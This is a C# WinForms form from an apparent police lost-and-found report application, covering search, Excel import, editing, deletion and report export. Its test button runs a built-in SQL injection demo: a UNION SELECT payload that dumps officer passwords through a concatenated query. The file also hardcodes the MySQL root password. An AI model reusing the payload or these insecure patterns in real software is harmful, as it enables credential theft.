using ExcelDataReader;
using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace STPLapp
{
    public partial class FormSearch : Form
    {
        string connectionString = "Server = localhost; database = SI_STPL_DB; UID = root; Password = 21914113";
        string idTerpilih = "";
        private string nrpPetugas;

        private BindingSource bindingSourceGudang = new BindingSource();

        public FormSearch(string nrp)
        {
            InitializeComponent();
            this.nrpPetugas = nrp;
            this.StartPosition = FormStartPosition.CenterScreen;
        }

        public FormSearch()
        {
            InitializeComponent();
        }

        public void simpanLog(string message)
        {
            using (MySqlConnection connLog = new MySqlConnection(connectionString))
            {
                try
                {
                    connLog.Open();
                    MySqlCommand cmd = new MySqlCommand("sp_LogMessage", connLog);
                    cmd.CommandType = CommandType.StoredProcedure;
                    cmd.Parameters.AddWithValue("@psn", message);
                    cmd.ExecuteNonQuery();
                }
                catch (Exception) { /* Fail-safe */ }
            }
        }

        private void FormSearch_Load(object sender, EventArgs e)
        {
            if (cmbKategori.Items.Count > 0 && cmbKategori.SelectedIndex == -1)
            {
                cmbKategori.SelectedIndex = 0;
            }
            TampilData();
        }

        private void TampilData(string keyword = "")
        {
            using (MySqlConnection conn = new MySqlConnection(connectionString))
            {
                try
                {
                    conn.Open();
                    string query = "";
                    bool isHilang = cmbKategori.Text == "Laporan Hilang";
                    string filterExpression = "";
                    if (cmbKolomCari.Text == "No STPL / ID")
                    {
                        filterExpression = isHilang ? "no_stpl LIKE @key" : "id_temuan LIKE @key";
                    }
                    else if (cmbKolomCari.Text == "Nama Pelapor / Penemu")
                    {
                        filterExpression = isHilang ? "nama_pelapor LIKE @key" : "nama_penemu LIKE @key";
                    }
                    else if (cmbKolomCari.Text == "Jenis Barang")
                    {
                        filterExpression = "jenis_barang LIKE @key";
                    }
                    else if (cmbKolomCari.Text == "TKP / Lokasi")
                    {
                        filterExpression = isHilang ? "tkp LIKE @key" : "lokasi_ditemukan LIKE @key";
                    }
                    else
                    {
                        filterExpression = isHilang
                            ? "(no_stpl LIKE @key OR nama_pelapor LIKE @key OR jenis_barang LIKE @key)"
                            : "(id_temuan LIKE @key OR nama_penemu LIKE @key OR jenis_barang LIKE @key)";
                    }
                    if (isHilang)
                    {
                        query = $"SELECT * FROM vw_laporan_hilang_lengkap WHERE {filterExpression}";
                    }
                    else
                    {
                        query = $"SELECT * FROM vw_barang_temuan_lengkap WHERE {filterExpression}";
                    }
                    MySqlCommand cmd = new MySqlCommand(query, conn);
                    cmd.Parameters.AddWithValue("@key", "%" + keyword + "%");
                    MySqlDataAdapter adapter = new MySqlDataAdapter(cmd);
                    DataTable dt = new DataTable();
                    adapter.Fill(dt);
                    bindingSourceGudang.DataSource = dt;
                    dgvGudang.DataSource = bindingSourceGudang;
                    bindingNavigator1.BindingSource = bindingSourceGudang;
                    dgvGudang.Columns["jenis_barang"].HeaderText = "Nama Barang";
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Gagal memuat data: " + ex.Message);
                }
            }
        }

        private void cmbKategori_SelectedIndexChanged(object sender, EventArgs e)
        {
            cmbStatus.Items.Clear();

            if (cmbKategori.Text == "Laporan Hilang")
            {
                cmbStatus.Items.Add("Dicari");
                cmbStatus.Items.Add("Tersimpan");
            }
            else
            {
                cmbStatus.Items.Add("Tersimpan");
                cmbStatus.Items.Add("Dikembalikan");
            }

            BersihkanForm();
            TampilData();
        }

        private void dgvGudang_CellClick(object sender, DataGridViewCellEventArgs e)
        {
            if (e.RowIndex >= 0)
            {
                DataGridViewRow row = dgvGudang.Rows[e.RowIndex];
                idTerpilih = row.Cells[0].Value.ToString();

                if (cmbKategori.Text == "Laporan Hilang")
                {
                    lblId.Text = row.Cells["no_stpl"].Value.ToString();
                    lblNik.Text = row.Cells["nik_pelapor"].Value.ToString();
                    lblNama.Text = row.Cells["nama_pelapor"].Value.ToString();
                    lblTanggal.Text = row.Cells["waktu_kejadian"].Value.ToString();
                    lblNrp.Text = row.Cells["nrp_petugas"].Value.ToString();

                    txtJenis.Text = row.Cells["jenis_barang"].Value.ToString();
                    txtCiri.Text = row.Cells["ciri_khusus"].Value.ToString();
                    txtLokasi.Text = row.Cells["tkp"].Value.ToString();
                    cmbStatus.Text = row.Cells["status_pencarian"].Value.ToString();
                }
                else
                {
                    lblId.Text = row.Cells["id_temuan"].Value.ToString();
                    lblNik.Text = row.Cells["nik_penemu"].Value.ToString();
                    lblNama.Text = row.Cells["nama_penemu"].Value.ToString();
                    lblTanggal.Text = row.Cells["waktu_ditemukan"].Value.ToString();
                    lblNrp.Text = row.Cells["nrp_petugas"].Value.ToString();

                    txtJenis.Text = row.Cells["jenis_barang"].Value.ToString();
                    txtCiri.Text = row.Cells["ciri_ciri"].Value.ToString();
                    txtLokasi.Text = row.Cells["lokasi_ditemukan"].Value.ToString();
                    cmbStatus.Text = row.Cells["status_gudang"].Value.ToString();
                }
            }
        }

        private void btnImportExcel_Click(object sender, EventArgs e)
        {
            if (cmbKategori.Text != "Laporan Hilang")
            {
                MessageBox.Show("Fitur Import Excel diprioritaskan untuk Laporan Kehilangan saja.", "Peringatan", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            OpenFileDialog ofd = new OpenFileDialog
            {
                Filter = "Excel Files (*.xlsx;*.xls)|*.xlsx;*.xls",
                Title = "Pilih File Excel Laporan Hilang"
            };

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    int barisTersimpan = 0, barisError = 0;
                    using (var stream = File.Open(ofd.FileName, FileMode.Open, FileAccess.Read))
                    {
                        using (var reader = ExcelReaderFactory.CreateReader(stream))
                        {
                            var result = reader.AsDataSet();
                            if (result.Tables.Count == 0) return;

                            DataTable dt = result.Tables[0];
                            using (MySqlConnection conn = new MySqlConnection(connectionString))
                            {
                                conn.Open();
                                string query = @"INSERT INTO tb_laporan_hilang 
                            (no_stpl, nik_pelapor, nama_pelapor, jenis_barang, ciri_khusus, tkp, waktu_kejadian, status_pencarian, nrp_petugas) 
                            VALUES (@no_stpl, @nik, @nama, @jenis, @ciri, @tkp, @waktu, @status, @nrp)
                            ON DUPLICATE KEY UPDATE 
                            nik_pelapor = VALUES(nik_pelapor), nama_pelapor = VALUES(nama_pelapor), jenis_barang = VALUES(jenis_barang), 
                            ciri_khusus = VALUES(ciri_khusus), tkp = VALUES(tkp), waktu_kejadian = VALUES(waktu_kejadian)";

                                for (int i = 1; i < dt.Rows.Count; i++)
                                {
                                    DataRow row = dt.Rows[i];
                                    if (row[0] == DBNull.Value || string.IsNullOrWhiteSpace(row[0].ToString())) continue;

                                    try
                                    {
                                        using (MySqlCommand cmd = new MySqlCommand(query, conn))
                                        {
                                            cmd.Parameters.AddWithValue("@no_stpl", row[0].ToString().Trim());
                                            cmd.Parameters.AddWithValue("@nik", row[1] != DBNull.Value ? row[1].ToString().Trim() : "");
                                            cmd.Parameters.AddWithValue("@nama", row[2] != DBNull.Value ? row[2].ToString().Trim() : "");
                                            cmd.Parameters.AddWithValue("@jenis", row[3] != DBNull.Value ? row[3].ToString().Trim() : "");
                                            cmd.Parameters.AddWithValue("@ciri", row[4] != DBNull.Value ? row[4].ToString().Trim() : "");
                                            cmd.Parameters.AddWithValue("@tkp", row[5] != DBNull.Value ? row[5].ToString().Trim() : "");

                                            DateTime tgl = DateTime.Now;
                                            if (row[6] != DBNull.Value) DateTime.TryParse(row[6].ToString(), out tgl);
                                            cmd.Parameters.AddWithValue("@waktu", tgl.ToString("yyyy-MM-dd HH:mm:ss"));

                                            cmd.Parameters.AddWithValue("@status", row[7] != DBNull.Value ? row[7].ToString().Trim() : "Dicari");
                                            cmd.Parameters.AddWithValue("@nrp", !string.IsNullOrEmpty(nrpPetugas) ? nrpPetugas : "20240140200");

                                            cmd.ExecuteNonQuery();
                                            barisTersimpan++;
                                        }
                                    }
                                    catch { barisError++; }
                                }
                            }
                        }
                    }
                    MessageBox.Show($"Import Selesai!\nSukses: {barisTersimpan} data\nGagal: {barisError} data", "Hasil Import", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    TampilData();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Gagal mengimpor data: " + ex.Message);
                }
            }
        }

        private void btnUpdate_Click(object sender, EventArgs e)
        {
            DialogResult dialog = MessageBox.Show("Apakah Anda yakin ingin mengubah detail data ini?", "Konfirmasi Ubah", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

            if (dialog == DialogResult.Yes)
            {
                MySqlConnection conn = new MySqlConnection(connectionString);
                try
                {
                    conn.Open();

                    MySqlCommand setSafeUpdates = new MySqlCommand("SET SQL_SAFE_UPDATES = 1;", conn);
                    setSafeUpdates.ExecuteNonQuery();

                    MySqlCommand cmd = new MySqlCommand();
                    cmd.Connection = conn;

                    if (cmbKategori.Text == "Laporan Hilang")
                    {
                        cmd.CommandText = "SP_UpdateStatusLaporan";
                        cmd.CommandType = CommandType.StoredProcedure;

                        cmd.Parameters.AddWithValue("p_no_stpl", idTerpilih);
                        cmd.Parameters.AddWithValue("p_jenis_barang", txtJenis.Text);
                        cmd.Parameters.AddWithValue("p_ciri_khusus", txtCiri.Text);
                        cmd.Parameters.AddWithValue("p_tkp", txtLokasi.Text);
                        cmd.Parameters.AddWithValue("p_status", cmbStatus.Text);
                    }
                    else
                    {
                        cmd.CommandType = CommandType.Text;
                        cmd.CommandText = "UPDATE tb_barang_temuan SET jenis_barang=@brg, ciri_ciri=@ciri, lokasi_ditemukan=@loc, status_gudang=@stat WHERE id_temuan=@id";
                        cmd.Parameters.AddWithValue("@brg", txtJenis.Text);
                        cmd.Parameters.AddWithValue("@ciri", txtCiri.Text);
                        cmd.Parameters.AddWithValue("@loc", txtLokasi.Text);
                        cmd.Parameters.AddWithValue("@stat", cmbStatus.Text);
                        cmd.Parameters.AddWithValue("@id", idTerpilih);
                    }

                    cmd.ExecuteNonQuery();
                    MessageBox.Show("Data berhasil diperbarui!", "Sukses", MessageBoxButtons.OK, MessageBoxIcon.Information);

                    BersihkanForm();
                    TampilData();
                }
                catch (MySqlException ex)
                {
                    simpanLog(ex.Message);
                    if (ex.Message.ToLower().Contains("safe"))
                    {
                        MessageBox.Show("SQL Error: Unsafe UPDATE operation not allowed.", "Sistem Keamanan Database", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                    else
                    {
                        MessageBox.Show("Gagal update database: " + ex.Message, "SQL Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                catch (Exception ex)
                {
                    simpanLog(ex.Message);
                    MessageBox.Show("Gagal update via SP: " + ex.Message, "General Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally { conn.Close(); }
            }
        }

        private void btnDelete_Click(object sender, EventArgs e)
        {
            DialogResult dialog = MessageBox.Show("Yakin mau hapus data " + idTerpilih + "?", "Konfirmasi", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

            if (dialog == DialogResult.Yes)
            {
                MySqlConnection conn = new MySqlConnection(connectionString);
                try
                {
                    conn.Open();
                    MySqlCommand cmd = new MySqlCommand();
                    cmd.Connection = conn;

                    if (cmbKategori.Text == "Laporan Hilang")
                    {
                        cmd.CommandText = "SP_DeleteLaporanHilang";
                        cmd.CommandType = CommandType.StoredProcedure;
                        cmd.Parameters.AddWithValue("@p_no_stpl", idTerpilih);
                    }
                    else
                    {
                        cmd.CommandText = "DELETE FROM tb_barang_temuan WHERE id_temuan=@id";
                        cmd.CommandType = CommandType.Text;
                        cmd.Parameters.AddWithValue("@id", idTerpilih);
                    }

                    cmd.ExecuteNonQuery();
                    MessageBox.Show("Data berhasil dihapus dari sistem!", "Sukses", MessageBoxButtons.OK, MessageBoxIcon.Information);

                    BersihkanForm();
                    TampilData();
                }
                catch (MySqlException ex)
                {
                    simpanLog(ex.Message);
                    MessageBox.Show("SQL Error saat menghapus: " + ex.Message, "Error Database", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                catch (Exception ex) { simpanLog(ex.Message); MessageBox.Show("Gagal hapus: " + ex.Message); }
                finally { conn.Close(); }
            }
        }

        private void btnSearch_Click(object sender, EventArgs e) { TampilData(txtSearch.Text); }

        private void btnRefresh_Click(object sender, EventArgs e) { TampilData(txtSearch.Text); }

        private void BersihkanForm()
        {
            lblId.Text = "-";
            lblNik.Text = "-";
            lblNama.Text = "-";
            txtJenis.Clear();
            txtCiri.Clear();
            txtLokasi.Clear();
            cmbStatus.SelectedIndex = -1;
            idTerpilih = "";
            txtSearch.Clear();
            lblTanggal.Text = "-";
            lblNrp.Text = "-";
        }

        private void btnBack_Click(object sender, EventArgs e)
        {
            FormMenu menu = new FormMenu(nrpPetugas);
            menu.Show();
            this.Hide();
        }

        private void FormSearch_FormClosed(object sender, FormClosedEventArgs e)
        {
            Application.Exit();
        }

        private void btnClear_Click(object sender, EventArgs e)
        {
            BersihkanForm();
        }

        private void btnTest_Click(object sender, EventArgs e)
        {
            cmbKategori.Text = "Laporan Hilang";
            string payloadSQLi = "xyz' UNION SELECT nrp, nama_petugas, pangkat, password_petugas, 'TERINJEKSI', 'LOKASI EXPLOIT', NOW(), 'Tersimpan', nrp, nama_petugas FROM tb_petugas -- ";
            txtSearch.Text = payloadSQLi;

            MySqlConnection conn = new MySqlConnection(connectionString);
            try
            {
                conn.Open();
                string query = "SELECT * FROM vw_laporan_hilang_lengkap WHERE no_stpl LIKE '%" + payloadSQLi + "%' OR nama_pelapor LIKE '%" + payloadSQLi + "%'";

                MySqlCommand cmd = new MySqlCommand(query, conn);
                MySqlDataAdapter adapter = new MySqlDataAdapter(cmd);
                DataTable dt = new DataTable();
                adapter.Fill(dt);

                bindingSourceGudang.DataSource = dt;
                dgvGudang.DataSource = bindingSourceGudang;

                MessageBox.Show("s̶͕̺̐̈́ͅy̵͙̰̤̣̑͒̈́̂̓̽̇͘͘s̸̢̲͈̱̦̫̺͕͚̥̥̗̤̣̥͘t̴̢̨̢̖͙͕̥̹͕̥̣̘͕͈̓͋̅̇̔̏̀́͘e̶̡͚̖̺̟̺̭̠̰͑̍͌̅̀̒̈́̉ḿ̸̛̮̰͙̙̣̝̣̣̯̖͓̘̭̿͜ ̵̢̭̞̺̱͇̖̑̀̓̈́̅̄̉̍͗͝ḣ̶̼̤̝̠͈̗̙̩͖͕͓̉̈́̆̾̎̈́̀̂ä̴̧͎͚̞͙̻̙͇̙́̇̄͊c̶̡̬̖̘̟̪̣̾͛́̾́̐͐̉̅̅̄̕͘ḳ̶̨̘͉̤̮̙̙͒͑̄͒͛͋͑̿̈̂̐͑͜͜͝è̴̡̡̺͉̣͆͛̽̚d̴̡͈̥̈̆͗̎̌̇̈́͊͒̒̕͝ͅ\n\ns̶͕̺̐̈́ͅy̵͙̰̤̣̑͒̈́̂̓̽̇͘͘s̸̢̲͈̱̦̫̺͕͚̥̥̗̤̣̥͘t̴̢̨̢̖͙͕̥̹͕̥̣̘͕͈̓͋̅̇̔̏̀́͘e̶̡͚̖̺̟̺̭̠̰͑̍͌̅̀̒̈́̉ḿ̸̛̮̰͙̙̣̝̣̣̯̖͓̘̭̿͜ ̵̢̭̞̺̱͇̖̑̀̓̈́̅̄̉̍͗͝ḣ̶̼̤̝̠͈̗̙̩͖͕͓̉̈́̆̾̎̈́̀̂ä̴̧͎͚̞͙̻̙͇̙́̇̄͊c̶̡̬̖̘̟̪̣̾͛́̾́̐͐̉̅̅̄̕͘ḳ̶̨̘͉̤̮̙̙͒͑̄͒͛͋͑̿̈̂̐͑͜͜͝è̴̡̡̺͉̣͆͛̽̚d̴̡͈̥̈̆͗̎̌̇̈́͊͒̒̕͝ͅ",
                                "Exploit Sukses", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
            catch (MySqlException ex)
            {
                simpanLog(ex.Message);
                MessageBox.Show("SQL Error saat simulasi: " + ex.Message, "Sistem Proteksi", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                simpanLog(ex.Message);
                MessageBox.Show("Error saat simulasi: " + ex.Message, "Sistem Proteksi", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                conn.Close();
            }
        }

        private void btnReset_Click(object sender, EventArgs e)
        {
            txtSearch.Clear();
            TampilData("");
            MessageBox.Show("Data berhasil di reset.", "System Restored", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void btnExportReport_Click(object sender, EventArgs e)
        {
            if (dgvGudang.Rows.Count == 0)
            {
                MessageBox.Show("Tidak ada data untuk dicetak!", "Peringatan", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            SaveFileDialog sfd = new SaveFileDialog
            {
                Filter = "PDF Files (*.pdf)|*.pdf|HTML Files (*.html)|*.html",
                FileName = $"Laporan_STPL_{cmbKategori.Text.Replace(" ", "_")}_{DateTime.Now:yyyyMMdd_HHmmss}"
            };

            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    StringBuilder sb = new StringBuilder();
                    sb.AppendLine("<!DOCTYPE html><html><head><meta charset='utf-8'><title>Laporan STPL</title>");
                    sb.AppendLine("<style>body { font-family: 'Segoe UI', Arial, sans-serif; margin: 40px; color: #333; line-height: 1.6; }");
                    sb.AppendLine(".header-table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }");
                    sb.AppendLine(".header-text { text-align: center; font-size: 14px; font-weight: bold; }");
                    sb.AppendLine(".line { border-top: 3px double #000; margin: 15px 0; }");
                    sb.AppendLine(".title { text-align: center; font-size: 18px; font-weight: bold; text-transform: uppercase; margin-bottom: 25px; }");
                    sb.AppendLine(".meta-info { margin-bottom: 20px; font-size: 13px; }");
                    sb.AppendLine("table.data-table { width: 100%; border-collapse: collapse; margin-top: 10px; }");
                    sb.AppendLine("table.data-table th, table.data-table td { border: 1px solid #777; padding: 8px 10px; text-align: left; font-size: 12px; }");
                    sb.AppendLine("table.data-table th { background-color: #f2f2f2; font-weight: bold; text-transform: uppercase; }");
                    sb.AppendLine("table.data-table tr:nth-child(even) { background-color: #fafafa; }");
                    sb.AppendLine(".signature-container { width: 100%; margin-top: 50px; border-collapse: collapse; }");
                    sb.AppendLine(".signature-cell { width: 50%; text-align: center; font-size: 13px; vertical-align: top; }</style></head><body>");

                    sb.AppendLine("<table class='header-table'><tr><td class='header-text'>KEPOLISIAN NEGARA REPUBLIK INDONESIA<br>DAERAH ISTIMEWA YOGYAKARTA<br>RESORT KOTA YOGYAKARTA</td></tr></table>");
                    sb.AppendLine("<div class='line'></div>");
                    sb.AppendLine($"<div class='title'>REKAPITULASI DATA {cmbKategori.Text.ToUpper()}<br>GUDANG STPL APP</div>");
                    sb.AppendLine($"<div class='meta-info'><strong>Kategori:</strong> {cmbKategori.Text}<br><strong>Tanggal Cetak:</strong> {DateTime.Now:dd MMMM yyyy HH:mm:ss}<br><strong>Jumlah Data:</strong> {dgvGudang.Rows.Count} record</div>");

                    sb.AppendLine("<table class='data-table'><thead><tr>");
                    bool isHilang = cmbKategori.Text == "Laporan Hilang";

                    if (isHilang)
                        sb.AppendLine("<th>No STPL</th><th>NIK Pelapor</th><th>Nama Pelapor</th><th>Jenis Barang</th><th>Ciri Khusus</th><th>TKP</th><th>Tanggal</th><th>Status</th><th>Petugas</th>");
                    else
                        sb.AppendLine("<th>ID Temuan</th><th>NIK Penemu</th><th>Nama Penemu</th><th>Jenis Barang</th><th>Ciri-Ciri</th><th>Lokasi</th><th>Tanggal</th><th>Status</th><th>Petugas</th>");
                    sb.AppendLine("</tr></thead><tbody>");

                    foreach (DataGridViewRow row in dgvGudang.Rows)
                    {
                        if (row.IsNewRow) continue;
                        sb.AppendLine("<tr>");
                        if (isHilang)
                        {
                            sb.AppendLine($"<td>{row.Cells["no_stpl"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["nik_pelapor"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["nama_pelapor"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["jenis_barang"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["ciri_khusus"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["tkp"].Value}</td>");
                            sb.AppendLine($"<td>{Convert.ToDateTime(row.Cells["waktu_kejadian"].Value):dd/MM/yyyy}</td>");
                            sb.AppendLine($"<td>{row.Cells["status_pencarian"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["nama_petugas"].Value} ({row.Cells["nrp_petugas"].Value})</td>");
                        }
                        else
                        {
                            sb.AppendLine($"<td>{row.Cells["id_temuan"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["nik_penemu"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["nama_penemu"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["jenis_barang"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["ciri_ciri"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["lokasi_ditemukan"].Value}</td>");
                            sb.AppendLine($"<td>{Convert.ToDateTime(row.Cells["waktu_ditemukan"].Value):dd/MM/yyyy}</td>");
                            sb.AppendLine($"<td>{row.Cells["status_gudang"].Value}</td>");
                            sb.AppendLine($"<td>{row.Cells["nama_petugas"].Value} ({row.Cells["nrp_petugas"].Value})</td>");
                        }
                        sb.AppendLine("</tr>");
                    }
                    sb.AppendLine("</tbody></table>");

                    sb.AppendLine("<table class='signature-container'><tr><td class='signature-cell'></td>");
                    sb.AppendLine($"<td class='signature-cell'>Yogyakarta, {DateTime.Now:dd MMMM yyyy}<br>Petugas Pemeriksa/Penerima Laporan<br><br><br><br><br><strong>( ________________________ )</strong><br>NRP: {(!string.IsNullOrEmpty(nrpPetugas) ? nrpPetugas : "Petugas Piket")}</td></tr></table>");
                    sb.AppendLine("</body></html>");

                    string targetPath = sfd.FileName;
                    bool isPdf = Path.GetExtension(targetPath).ToLower() == ".pdf";

                    if (isPdf)
                    {
                        string tempHtmlPath = Path.Combine(Path.GetTempPath(), $"temp_report_{DateTime.Now.Ticks}.html");
                        File.WriteAllText(tempHtmlPath, sb.ToString());

                        string edgePath = @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";
                        if (!File.Exists(edgePath))
                        {
                            edgePath = @"C:\Program Files\Microsoft\Edge\Application\msedge.exe";
                        }

                        if (File.Exists(edgePath))
                        {
                            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
                            psi.FileName = edgePath;
                            psi.Arguments = $"--headless --disable-gpu --print-to-pdf=\"{targetPath}\" \"{tempHtmlPath}\"";
                            psi.UseShellExecute = false;
                            psi.CreateNoWindow = true;
                            using (System.Diagnostics.Process p = System.Diagnostics.Process.Start(psi))
                            {
                                p.WaitForExit();
                            }

                            System.Threading.Thread.Sleep(2000);

                            if (File.Exists(tempHtmlPath))
                            {
                                try { File.Delete(tempHtmlPath); } catch { }
                            }

                            if (File.Exists(targetPath))
                            {
                                DialogResult dr = MessageBox.Show("Laporan PDF berhasil dibuat! Buka file sekarang?", "Sukses", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                                if (dr == DialogResult.Yes)
                                {
                                    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(targetPath) { UseShellExecute = true });
                                }
                            }
                            else
                            {
                                MessageBox.Show("Gagal menulis file PDF. Pastikan Anda memiliki izin akses untuk menyimpan file di folder tersebut.", "Error Menulis PDF", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }
                        else
                        {
                            File.WriteAllText(targetPath.Replace(".pdf", ".html"), sb.ToString());
                            MessageBox.Show("Aplikasi MS Edge tidak ditemukan. Laporan dialihkan simpan ke HTML. Silakan cetak ke PDF dari browser.", "Peringatan", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }
                    }
                    else
                    {
                        File.WriteAllText(targetPath, sb.ToString());
                        DialogResult dr = MessageBox.Show("Laporan HTML berhasil dibuat! Buka file sekarang?", "Sukses", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                        if (dr == DialogResult.Yes)
                        {
                            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(targetPath) { UseShellExecute = true });
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Gagal mengekspor laporan: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }
}